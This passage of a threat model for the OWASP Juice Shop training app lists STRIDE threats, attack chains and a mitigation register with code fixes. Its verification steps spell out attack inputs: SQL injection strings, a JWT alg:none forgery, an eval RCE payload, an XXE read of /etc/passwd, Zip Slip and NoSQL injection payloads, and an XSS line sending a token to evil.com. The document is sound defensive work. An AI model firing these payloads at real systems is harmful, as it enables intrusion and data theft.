|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-028"></a>T-028 | auth-service | Spoofing | `POST /api/Users/register` accepts any email address without verification. Attacker registers as `admin@juice-sh.op` or any existing user email variant to impersonate users in the UI and receive phishing payloads to that email. CWE-287. | Medium | Medium | 🟡 Medium | None | [M-022](#m-022) |
| <a id="t-029"></a>T-029 | b2b-api | Elevation of Privilege | `routes/changePassword.ts` line ~20: current password check is conditional — `if (currentPassword && ...)`. If attacker includes no `currentPassword` field, the check is skipped entirely, allowing password change without knowing the current password (requires knowing the user ID from IDOR). CWE-620. | Medium | Medium | 🟡 Medium | Authentication required | [M-023](#m-023) |
| <a id="t-030"></a>T-030 | rest-api | Information Disclosure | `GET /api/Products` returns all internal product fields including `deletedAt` timestamps and internal IDs — information useful for constructing targeted injections. No field filtering applied. CWE-200. | High | Low | 🟡 Medium | None | [M-017](#m-017) |
| <a id="t-031"></a>T-031 | rest-api | Information Disclosure | `GET /metrics` at [`server.ts:720`](vscode://file/home/mrohr/juice-shop/server.ts:720) exposes Prometheus metrics unauthenticated: active sessions count, route hit counts, memory usage, heap statistics — enabling reconnaissance for DoS timing and session enumeration. CWE-200. | High | Medium | 🟡 Medium | None | [M-024](#m-024) |
| <a id="t-032"></a>T-032 | rest-api | Information Disclosure | `GET /api/Challenges` returns the full list of challenge names, descriptions, and expected flag values — effectively a walkthrough guide for all Juice Shop CTF challenges. CWE-200. | High | Low | 🟡 Medium | None | [M-024](#m-024) |
| <a id="t-033"></a>T-033 | auth-service | Denial of Service | Rate limiting via express-rate-limit at [`server.ts:345`](vscode://file/home/mrohr/juice-shop/server.ts:345) trusts `X-Forwarded-For` header. Attacker rotates spoofed IP with each request, bypassing the per-IP window and performing unlimited brute-force against login, registration, and password reset endpoints. CWE-307. | High | Medium | 🟡 Medium | Rate limiter (bypassable) | [M-025](#m-025) |
| <a id="t-034"></a>T-034 | admin-panel | Information Disclosure | `GET /rest/user/authentication-details` at [`routes/authenticatedUsers.ts`](vscode://file/home/mrohr/juice-shop/routes/authenticatedUsers.ts) returns active session tokens and user details for all users to any authenticated request — no admin role check. CWE-285. | Medium | Medium | 🟡 Medium | Authentication required (not admin-only) | [M-015](#m-015) |
| <a id="t-035"></a>T-035 | admin-panel | Elevation of Privilege | Admin panel UI route is guarded by Angular route guard only — no backend role check on admin-accessible API endpoints like `GET /api/Users`, `DELETE /api/Users/:id`. An authenticated non-admin can call these directly with a valid JWT. CWE-862. | Medium | Medium | 🟡 Medium | Frontend route guard (client-side only) | [M-015](#m-015), [M-017](#m-017) |
| <a id="t-036"></a>T-036 | ci-cd-pipeline | Information Disclosure | `package.json` includes `frisby` as a git dependency (`git+https://github.com/…`). The referenced git repo can be modified by its owner after the dependency is pinned, introducing malicious test code that runs in CI with full source access. CWE-1357. | Low | Medium | 🟡 Medium | Dependabot (does not cover git deps) | [M-021](#m-021) |

### 8.4 Low (6)

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-037"></a>T-037 | rest-api | Repudiation | No CSRF protection on state-changing POST/PUT/DELETE endpoints. Attacker hosts `<img src="https://juice-shop/api/Users/1" style="display:none">` — victim's browser sends credentialed request. Without SameSite=Strict cookies or CSRF tokens, the request is accepted. CWE-352. | Low | Medium | 🟢 Low | None | [M-026](#m-026) |
| <a id="t-038"></a>T-038 | rest-api | Information Disclosure | Error responses from Sequelize and Express include full stack traces and SQL query fragments in production. Attacker can extract table names, column names, and file paths from 500 responses. CWE-209. | High | Low | 🟢 Low | None | [M-010](#m-010) |
| <a id="t-039"></a>T-039 | frontend-spa | Information Disclosure | `localStorage.getItem('token')` accessible from browser DevTools, cross-origin scripts (via XSS), and browser extensions. Any XSS immediately yields the JWT. CWE-922. | Medium | Low | 🟢 Low | None | [M-012](#m-012) |
| <a id="t-040"></a>T-040 | frontend-spa | Repudiation | No client-side or server-side audit trail of user actions (add to basket, checkout, coupon application). Users can repudiate orders and coupon usage with no forensic evidence. CWE-778. | Low | Low | 🟢 Low | winston logs (incomplete) | [M-010](#m-010) |
| <a id="t-041"></a>T-041 | ci-cd-pipeline | Tampering | Dockerfile uses `npm install --unsafe-perm` at the build stage, allowing lifecycle scripts (`preinstall`, `postinstall`) to execute as root during `docker build`. A compromised transitive dependency can exfiltrate build secrets or backdoor the image. CWE-269. | Low | Medium | 🟢 Low | Multi-stage build, distroless final image | [M-027](#m-027) |
| <a id="t-042"></a>T-042 | ci-cd-pipeline | Repudiation | CodeQL SAST results are uploaded to GitHub but not enforced as a required check — PRs can be merged with open Critical/High alerts. No SAST gate in merge policy. CWE-778. | Medium | Low | 🟢 Low | CodeQL workflow exists | [M-021](#m-021) |


---

<!-- QA: Section 9 should be a two-line stub pointing to [Critical Attack Chain](#critical-attack-chain) and [Section 8.1](#81-critical-9). The current content (Mermaid diagram + Quick Reference table) should live in the ## Critical Attack Chain block and Section 8.1 respectively. The per-finding diagram below duplicates the Critical Attack Chain diagrams. See phase-group-threats.md → "Section 8 stub". -->
## 9. Critical Findings

The nine Critical-rated threats form three distinct attack chains, each completable by an unauthenticated attacker in under 10 minutes against a default deployment. See [Critical Attack Chain](#critical-attack-chain) for visual attack flows and [Section 8.1 Critical](#81-critical-9) for per-threat detail rows.

```mermaid
graph TD
    A["Unauthenticated Attacker"] -->|"POST /api/Users/login email=' OR 1=1--'"| B["T-001: Auth Bypass via SQLi"]
    A -->|"GET /rest/products/search?q=')) UNION SELECT..."| C["T-002: Schema + User Dump via SQLi"]
    B --> D["T-003: MD5 Rainbow Table Crack"]
    C --> D
    D --> E["Admin Account Takeover"]
    E --> F["T-006: Stored XSS via Admin Email"]
    F --> G["All User Sessions Compromised"]

    H["Authenticated Attacker"] -->|"JWT alg:none bypass"| I["T-004: Forged Admin JWT"]
    I -->|"orderLinesData=...eval(process.exec...)"| J["RCE on Server"]
    J --> K["Full Host Compromise"]

    L["Authenticated Attacker"] -->|"POST /file-upload with XML"| M["T-009: XXE reads /etc/passwd"]
    L -->|"POST /file-upload with ZIP"| N["T-008: Zip Slip path traversal"]
    M --> O["Internal File Exfiltration"]
    N --> O

    classDef critical fill:#c00,color:#fff,stroke:#900
    classDef high fill:#e65c00,color:#fff,stroke:#b34700
    classDef attacker fill:#333,color:#fff,stroke:#000
    class A,H,L attacker
    class B,C,D,F,I,J,M,N critical
    class E,G,K,O high
```

**Key takeaway:** Three independent unauthenticated paths lead to full application compromise. The SQL injection chain (T-001 + T-003) requires no prior knowledge. The JWT + RCE chain (T-004) requires a registered account. The file upload chains (T-008, T-009) require authentication. All three converge on full data exfiltration or host control.

### Quick Reference

| Threat | Component | STRIDE | Linked Mitigation |
|--------|-----------|--------|-------------------|
| [T-001](#t-001) Auth bypass via SQLi | auth-service | Tampering | [M-001](#m-001) |
| [T-002](#t-002) UNION SQLi data dump | rest-api | Information Disclosure | [M-001](#m-001) |
| [T-003](#t-003) MD5 password cracking | auth-service | Information Disclosure | [M-002](#m-002) |
| [T-004](#t-004) JWT alg:none + RCE | b2b-api | Elevation of Privilege | [M-003](#m-003), [M-004](#m-004) |
| [T-005](#t-005) Reflected XSS in search | frontend-spa | Tampering | [M-005](#m-005), [M-006](#m-006) |
| [T-006](#t-006) Stored XSS via admin email | admin-panel | Tampering | [M-005](#m-005), [M-006](#m-006) |
| [T-007](#t-007) Hardcoded RSA private key | rest-api | Information Disclosure | [M-007](#m-007) |
| [T-008](#t-008) Zip Slip path traversal | file-upload | Elevation of Privilege | [M-008](#m-008) |
| [T-009](#t-009) XXE arbitrary file read | file-upload | Information Disclosure | [M-009](#m-009) |

---

## 10. Mitigation Register

### P1 — Immediate

---

#### <a id="m-001"></a>M-001 — Parameterize All Database Queries

**Addresses:** [T-001](#t-001), [T-002](#t-002), [T-013](#t-013)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** Two independently exploitable SQL injection vulnerabilities (login bypass, UNION data dump) allow unauthenticated takeover of every user account. These are P1 because no authentication is required and exploitation is trivial.

**How:**

1. Replace all raw string interpolation in Sequelize queries with parameterized form using `replacements` or `bind`.
2. In [`routes/login.ts:34`](vscode://file/home/mrohr/juice-shop/routes/login.ts:34):

```javascript
// BEFORE (vulnerable):
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email}' AND password = '${security.hash(req.body.password)}'`)

// AFTER (safe):
models.sequelize.query(
  'SELECT * FROM Users WHERE email = :email AND password = :password AND deletedAt IS NULL',
  { replacements: { email: req.body.email, password: security.hash(req.body.password) }, type: models.sequelize.QueryTypes.SELECT }
)
```

3. Apply the same pattern to [`routes/search.ts:23`](vscode://file/home/mrohr/juice-shop/routes/search.ts:23):

```javascript
// BEFORE (vulnerable):
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL)`)

// AFTER (safe):
models.sequelize.query(
  "SELECT * FROM Products WHERE ((name LIKE :criteria OR description LIKE :criteria) AND deletedAt IS NULL)",
  { replacements: { criteria: `%${criteria}%` }, type: models.sequelize.QueryTypes.SELECT }
)
```

4. Audit all other `models.sequelize.query()` calls for string interpolation — use `grep -rn 'sequelize.query.*\`' routes/` to find remaining instances.

**Verification:** `sqlmap -u "http://localhost:3000/rest/products/search?q=test" --level=3 --risk=2` should return "not injectable" for the `q` parameter. Login with `' OR 1=1--` as email should return 401.

**Reference:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) | [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

#### <a id="m-002"></a>M-002 — Replace MD5 with bcrypt for Password Storage

**Addresses:** [T-003](#t-003)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** MD5 without salt means every password in the database is instantly crackable via rainbow tables once the DB is dumped. This compounds T-001/T-002 into full account compromise.

**How:**

1. Install bcrypt: `npm install bcrypt @types/bcrypt`.
2. Replace the hash function in [`lib/insecurity.ts:44`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:44):

```typescript
// BEFORE:
export const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')

// AFTER:
import bcrypt from 'bcrypt'
const SALT_ROUNDS = 12
export const hash = async (data: string): Promise<string> => bcrypt.hash(data, SALT_ROUNDS)
export const verifyPassword = async (plain: string, hashed: string): Promise<boolean> => bcrypt.compare(plain, hashed)
```

3. Update login route to use async `verifyPassword()` instead of synchronous hash comparison.
4. Migrate existing password hashes on next user login (verify MD5 match, rehash with bcrypt, store new hash).

**Verification:** Register a new user, inspect the Users table — `password` column should contain `$2b$12$...` format. Brute-force with `hashcat -m 3200 hash.txt wordlist.txt` should fail in reasonable time.

**Reference:** [CWE-916](https://cwe.mitre.org/data/definitions/916.html) | [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

---

#### <a id="m-003"></a>M-003 — Upgrade JWT Library and Enforce Algorithm Pinning

**Addresses:** [T-004](#t-004), [T-010](#t-010)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Low

**Why:** jsonwebtoken 0.4.0 and express-jwt 0.1.3 are from 2013 and accept `alg: none`. This allows unauthenticated JWT forgery combined with RCE (T-004).

**How:**

1. Upgrade: `npm install jsonwebtoken@^9 express-jwt@^8 @types/jsonwebtoken`.
2. Pin algorithm explicitly when verifying:

```typescript
// BEFORE (lib/insecurity.ts:57):
export const verify = (token: string) => token ? (jws.verify as any)(token, publicKey) : false

// AFTER:
import jwt from 'jsonwebtoken'
export const verify = (token: string) => {
  if (\!token) return false
  return jwt.verify(token, publicKey, { algorithms: ['RS256'] })
}
```

3. Remove the `jws` direct dependency.
4. Update `express-jwt` middleware call to pass `{ algorithms: ['RS256'] }`.

**Verification:** Decode a valid JWT, change `"alg": "RS256"` to `"alg": "none"`, remove the signature segment — the server should return 401 Unauthorized.

**Reference:** [CWE-327](https://cwe.mitre.org/data/definitions/327.html) | [JWT Security Best Practices](https://curity.io/resources/learn/jwt-best-practices/)

---

#### <a id="m-004"></a>M-004 — Remove eval-Based B2B Order Processing

**Addresses:** [T-004](#t-004), [T-012](#t-012)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** High

**Why:** The notevil sandbox is a known escape target. Any sandboxed eval is risky — remove it entirely in favor of a declarative schema.

**How:**

1. Remove `notevil` and `vm` usage from [`routes/b2bOrder.ts`](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts).
2. Replace with JSON Schema validation using `ajv`:

```typescript
import Ajv from 'ajv'
const ajv = new Ajv()
const orderSchema = {
  type: 'array',
  items: {
    type: 'object',
    required: ['productId', 'quantity'],
    properties: {
      productId: { type: 'integer', minimum: 1 },
      quantity: { type: 'integer', minimum: 1, maximum: 999 }
    },
    additionalProperties: false
  }
}
const validateOrder = ajv.compile(orderSchema)
// In handler: if (\!validateOrder(req.body.orderLines)) return res.status(400).json({error: ajv.errorsText(validateOrder.errors)})
```

3. Add `Content-Length` limit middleware before the B2B route: `app.use('/api/Orders', express.json({ limit: '100kb' }))`.

**Verification:** POST with `"orderLinesData": "process.mainModule.require('child_process').execSync('id')"` should return 400. POST with `[{"productId": 1, "quantity": 2}]` should succeed.

**Reference:** [CWE-94](https://cwe.mitre.org/data/definitions/94.html) | [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)

---

#### <a id="m-005"></a>M-005 — Remove bypassSecurityTrustHtml Calls

**Addresses:** [T-005](#t-005), [T-006](#t-006), [T-014](#t-014)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** Two XSS entry points with no CSP backstop allow session theft and admin compromise. Both are exploitable via the public search bar (T-005) with no authentication.

**How:**

1. In [`frontend/src/app/search-result/search-result.component.ts:170`](vscode://file/home/mrohr/juice-shop/frontend/src/app/search-result/search-result.component.ts:170):

```typescript
// BEFORE:
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)

// AFTER:
this.searchValue = queryParam  // Angular's default sanitization applies
```

2. Change the template binding from `[innerHTML]="searchValue"` to `{{ searchValue }}` (text interpolation) — eliminates HTML rendering entirely.
3. Apply the same change to [`frontend/src/app/administration/administration.component.ts:60`](vscode://file/home/mrohr/juice-shop/frontend/src/app/administration/administration.component.ts:60).
4. Audit all `bypassSecurityTrustHtml`, `bypassSecurityTrustUrl`, and `bypassSecurityTrustScript` calls: `grep -rn 'bypassSecurityTrust' frontend/src/`.

**Verification:** Navigate to `/#/search?q=<script>alert(1)</script>` — alert should NOT fire. Admin email field with HTML content should render as escaped text.

**Reference:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html) | [Angular Security Guide](https://angular.dev/best-practices/security)

---

#### <a id="m-006"></a>M-006 — Implement Content Security Policy

**Addresses:** [T-005](#t-005), [T-006](#t-006)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** CSP is the browser-layer backstop that limits XSS damage even if bypassSecurityTrustHtml calls are missed. Currently completely absent.

**How:**

1. Enable CSP via `helmet.contentSecurityPolicy()` in [`server.ts`](vscode://file/home/mrohr/juice-shop/server.ts) — uncomment and configure the CSP line at `server.ts:187`:

```typescript
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],          // remove 'unsafe-inline' after fixing inline scripts
    styleSrc: ["'self'", "'unsafe-inline'"],  // inline styles common in Angular
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}))
```

2. Add a `report-uri` endpoint to collect CSP violations for ongoing monitoring.
3. Test in report-only mode first: `Content-Security-Policy-Report-Only` header.

**Verification:** Load the application — browser DevTools Network tab should show `Content-Security-Policy` response header. Injected `<script>alert(1)</script>` should produce a CSP violation report and not execute.

**Reference:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html) | [MDN CSP Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

#### <a id="m-007"></a>M-007 — Rotate and Externalize All Hardcoded Secrets

**Addresses:** [T-007](#t-007), [T-010](#t-010)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** RSA private key and HMAC secret are committed to git history — every token ever issued can be forged. Rotation cannot be deferred.

**How:**

1. Generate a new RSA keypair: `openssl genrsa -out private.pem 4096 && openssl rsa -in private.pem -pubout -out public.pem`.
2. Move secrets to environment variables — replace [`lib/insecurity.ts:23`](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:23) and `:45`:

```typescript
// BEFORE:
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAK...'
export const hmacKey = 'this is the secret'

// AFTER:
const privateKey = process.env.JWT_PRIVATE_KEY?.replace(/\\n/g, '\n') ?? (() => { throw new Error('JWT_PRIVATE_KEY not set') })()
export const hmacKey = process.env.HMAC_SECRET ?? (() => { throw new Error('HMAC_SECRET not set') })()
```

3. Add `JWT_PRIVATE_KEY`, `JWT_PUBLIC_KEY`, `HMAC_SECRET`, and `COOKIE_SECRET` to `.env.example` (non-sensitive placeholder values only).
4. Add `.env` to `.gitignore`.
5. **Immediately rotate** the exposed key — all existing JWTs signed with the old key must be invalidated by changing the key.
6. Consider using a secrets manager (AWS Secrets Manager, HashiCorp Vault, or GitHub Actions Secrets) for CI/CD.

**Verification:** `grep -rn 'BEGIN RSA' lib/ frontend/ server.ts` should return no matches. Application starts only when environment variables are set.

**Reference:** [CWE-321](https://cwe.mitre.org/data/definitions/321.html) | [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)

---

#### <a id="m-008"></a>M-008 — Fix Path Traversal in ZIP Upload (Zip Slip)

**Addresses:** [T-008](#t-008), [T-026](#t-026)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Low

**Why:** Zip Slip allows writing arbitrary files to the server filesystem, potentially overwriting application code or writing web shells.

**How:**

1. Replace the `includes('../')` check in [`routes/fileUpload.ts:40`](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:40) with a proper path canonicalization check:

```typescript
// BEFORE (vulnerable):
if (entry.fileName.includes('../')) { ... }

// AFTER (safe):
import path from 'path'
const targetPath = path.resolve(uploadDir, entry.fileName)
if (\!targetPath.startsWith(path.resolve(uploadDir) + path.sep)) {
  throw new Error('Zip Slip attempt detected: ' + entry.fileName)
}
```

2. Apply the same pattern to the FTP path traversal at `/ftp/:filename`.
3. Limit the upload directory to a sandboxed location outside the application root.

**Verification:** Create a ZIP with entry `../../../tmp/evil.txt` — extraction should throw an error and not create the file. Verify with `find / -name evil.txt 2>/dev/null`.

**Reference:** [CWE-22](https://cwe.mitre.org/data/definitions/22.html) | [Zip Slip Advisory](https://github.com/snyk/zip-slip-vulnerability)

---

#### <a id="m-009"></a>M-009 — Disable External Entity Processing in XML Parser

**Addresses:** [T-009](#t-009), [T-023](#t-023)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Low

**Why:** `noent: true` explicitly enables external entity processing — a single config change enables XXE. This is the simplest P1 fix in the register.

**How:**

1. Change the libxmljs2 options in [`routes/fileUpload.ts:75`](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:75):

```typescript
// BEFORE (vulnerable — noent:true enables XXE):
libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })

// AFTER (safe):
libxml.parseXml(data, { noblanks: true, noent: false, nocdata: true })
```

2. Additionally disable network access from the XML parser by setting `nonet: true`.
3. Validate that the parsed XML matches an expected schema (e.g., order line items only) using an XML Schema Definition.

**Verification:** Upload `<?xml version="1.0"?><\!DOCTYPE x [<\!ENTITY xxe SYSTEM "file:///etc/passwd">]><order>&xxe;</order>` — response should not contain `/etc/passwd` contents. Parser should return a parse error or empty entity.

**Reference:** [CWE-611](https://cwe.mitre.org/data/definitions/611.html) | [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

### P2 — This Sprint

---

#### <a id="m-010"></a>M-010 — Structured Security Event Logging

**Addresses:** [T-011](#t-011), [T-038](#t-038), [T-040](#t-040)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** Absence of structured security logs prevents incident response and enables repudiation of malicious actions.

**How:**

1. Add a security logging middleware that emits JSON-structured events for: authentication attempts (success/failure), password changes, privilege escalations, admin actions, file uploads.
2. Suppress stack traces in production error responses:

```typescript
// In error handler middleware:
if (process.env.NODE_ENV === 'production') {
  res.status(err.status || 500).json({ error: 'Internal Server Error', requestId: req.id })
} else {
  res.status(err.status || 500).json({ error: err.message, stack: err.stack })
}
```

3. Add `REQUEST_ID` header to all responses for log correlation.

**Verification:** Trigger a failed login — `logs/access.log` should contain a JSON entry with `{"event":"login_failure","email":"...","ip":"...","timestamp":"..."}`. Error responses in production mode should not contain stack traces.

**Reference:** [CWE-778](https://cwe.mitre.org/data/definitions/778.html) | [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)

---

#### <a id="m-011"></a>M-011 — Request Size Limits and Query Timeouts

**Addresses:** [T-012](#t-012), [T-013](#t-013), [T-024](#t-024)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** Unbounded request sizes and query times allow single-request DoS against the event loop.

**How:**

1. Add global body size limit to [`server.ts`](vscode://file/home/mrohr/juice-shop/server.ts): `app.use(express.json({ limit: '1mb' }))`.
2. Add per-route limits for file upload: `multer({ limits: { fileSize: 10 * 1024 * 1024 } })` (10MB).
3. Add Sequelize query timeout: `models.sequelize.options.dialectOptions = { statement_timeout: 5000 }`.
4. Add ZIP extraction size limit in the upload handler.

**Verification:** POST a 50MB JSON body to `/api/Orders` — should return 413 Payload Too Large. Submit a ZIP bomb — extraction should abort with a size limit error.

**Reference:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)

---

#### <a id="m-012"></a>M-012 — Move JWT from localStorage to HttpOnly Cookie

**Addresses:** [T-014](#t-014), [T-039](#t-039)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** localStorage-stored JWTs are accessible to any JavaScript on the page. HttpOnly cookies are immune to XSS token theft.

**How:**

1. On login success, set the JWT as an HttpOnly, Secure, SameSite=Strict cookie instead of returning it in the response body.
2. Update [`request.interceptor.ts`](vscode://file/home/mrohr/juice-shop/frontend/src/app/Services/request.interceptor.ts) — remove the `Authorization: Bearer` header injection (cookies are sent automatically).
3. Update `express-jwt` to read from cookie: `{ getToken: (req) => req.cookies.token }`.
4. Add `cookie-parser` middleware if not present.

**Verification:** Log in — DevTools Application > Cookies should show `token` cookie with `HttpOnly` flag. `localStorage.getItem('token')` should return `null`. XSS payload `fetch('//evil.com?t='+localStorage.token)` should send null.

**Reference:** [CWE-922](https://cwe.mitre.org/data/definitions/922.html) | [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

#### <a id="m-013"></a>M-013 — Fix Open Redirect Allowlist Logic

**Addresses:** [T-015](#t-015)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** The open redirect allows phishing attacks where victims are sent to attacker-controlled sites via a trusted Juice Shop URL. The substring-based allowlist check is trivially bypassed by appending the expected string as a query parameter.

**How:**

```typescript
// BEFORE (bypassable):
if (url.includes('https://github.com/bkimminich/juice-shop')) { res.redirect(url) }

// AFTER (safe):
const ALLOWED_REDIRECT_URLS = ['https://github.com/bkimminich/juice-shop']
const parsedUrl = new URL(url)
if (ALLOWED_REDIRECT_URLS.some(allowed => { const a = new URL(allowed); return parsedUrl.origin === a.origin && parsedUrl.pathname.startsWith(a.pathname) })) {
  res.redirect(url)
} else {
  res.status(400).json({ error: 'Invalid redirect target' })
}
```

**Verification:** GET `/redirect?to=https://evil.com?x=https://github.com/bkimminich/juice-shop` should return 400, not redirect.

**Reference:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html) | [OWASP Unvalidated Redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)

---

#### <a id="m-014"></a>M-014 — Encrypt SQLite Database at Rest

**Addresses:** [T-016](#t-016)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** The SQLite database file is stored unencrypted on disk. Any container escape, filesystem access, or backup exfiltration immediately yields all user credentials, PII, and order data without requiring any active exploitation of the running application.

**How:** Use `better-sqlite3` with SQLCipher extension, or store the SQLite file on an encrypted volume. Ensure the encryption key is sourced from the environment, not hardcoded.

**Verification:** Stop the application, attempt to open `data/juiceshop.sqlite` with `sqlite3` CLI — should prompt for a passphrase or show encrypted binary content.

**Reference:** [CWE-312](https://cwe.mitre.org/data/definitions/312.html)

---

#### <a id="m-015"></a>M-015 — Enforce Backend Authorization on All Admin Routes

**Addresses:** [T-017](#t-017), [T-034](#t-034), [T-035](#t-035)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** Admin-level API endpoints are currently protected only by the Angular frontend route guard or a customer-level `isAuthorized()` check. Any authenticated user can call these endpoints directly via curl or Burp Suite, bypassing the frontend restriction entirely.

**How:**

1. Restore the commented-out middleware in [`server.ts`](vscode://file/home/mrohr/juice-shop/server.ts): `app.put('/api/Products/:id', security.isAuthorized(), ...)`.
2. Add `security.isAdmin()` middleware to: `GET /api/Users`, `DELETE /api/Users/:id`, `GET /rest/user/authentication-details`, all admin-panel API endpoints.
3. Implement `isAdmin()` as a middleware that checks `req.user.role === 'admin'` from the verified JWT payload.

**Verification:** Call `GET /api/Users` with a non-admin JWT — should return 403. Call with admin JWT — should return 200.

**Reference:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html)

---

#### <a id="m-016"></a>M-016 — Restrict FTP Directory Access

**Addresses:** [T-018](#t-018), [T-025](#t-025)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** The `/ftp` directory is served with full directory listing and no authentication, exposing confidential documents including a KeePass database, legal acquisition documents, and historical coupon codes to any unauthenticated user.

**How:**

1. Remove `serveIndex` from the FTP route or add authentication: `app.use('/ftp', security.isAuthorized(), serveIndex(...))`.
2. Remove sensitive files from `ftp/` directory (confidential documents, backup files).
3. If directory listing is required by design, apply role-based access control.

**Verification:** GET `/ftp/` without credentials should return 401. Sensitive files should not appear in the directory listing.

**Reference:** [CWE-548](https://cwe.mitre.org/data/definitions/548.html)

---

#### <a id="m-017"></a>M-017 — Add Object-Level Ownership Checks (IDOR Fix)

**Addresses:** [T-019](#t-019), [T-030](#t-030)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** Basket and other resource endpoints accept numeric IDs as path parameters without verifying the requesting user owns the resource. An authenticated attacker can iterate IDs to access any user's basket, exposing delivery addresses and purchase history.

**How:**

1. In [`routes/basket.ts:20`](vscode://file/home/mrohr/juice-shop/routes/basket.ts:20), after fetching the basket, verify ownership:

```typescript
const basket = await BasketModel.findOne({ where: { id }, include: [...] })
if (\!basket || basket.UserId \!== req.user.id) {
  return res.status(403).json({ error: 'Forbidden' })
}
```

2. Apply the same pattern to any other endpoint that accepts a user/resource ID as a path parameter.
3. Restrict `GET /api/Products` response to only public fields using Sequelize `attributes` option.

**Verification:** Log in as User A, obtain basket ID. Log in as User B, GET `/rest/basket/<User A's ID>` — should return 403.

**Reference:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html) | [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)

---

#### <a id="m-018"></a>M-018 — Fix NoSQL Injection in Review Update

**Addresses:** [T-020](#t-020)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** The review update endpoint passes the user-controlled `_id` field directly to marsdb as a query filter with `multi: true`. A NoSQL injection payload (`{ "$gt": "" }`) selects all reviews and overwrites them with the attacker's message, enabling mass content defacement.

**How:**

```typescript
// BEFORE (routes/updateProductReviews.ts:15 — vulnerable):
db.reviewsCollection.update({ _id: req.body.id }, { $set: { message: req.body.message } }, { multi: true })

// AFTER (safe):
// 1. Validate _id is a string (not object):
if (typeof req.body.id \!== 'string') return res.status(400).json({ error: 'Invalid id' })
// 2. Use single-document update (remove multi: true):
db.reviewsCollection.update({ _id: req.body.id }, { $set: { message: req.body.message } })
// 3. Add ownership check: req.body.author === req.user.email
```

**Verification:** POST `{ "id": { "$gt": "" }, "message": "hacked" }` should return 400. Legitimate review update should succeed for the owner only.

**Reference:** [CWE-943](https://cwe.mitre.org/data/definitions/943.html)

---

#### <a id="m-019"></a>M-019 — Add SSRF Guard to Profile Image URL Upload

**Addresses:** [T-021](#t-021)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** The profile image URL endpoint makes a server-side HTTP request to any attacker-supplied URL with no validation. This enables SSRF attacks against internal services, cloud metadata endpoints (AWS IMDS), and localhost-bound services that are not exposed to the internet.

**How:**

```typescript
// routes/profileImageUrlUpload.ts — add before fetch():
import { URL } from 'url'
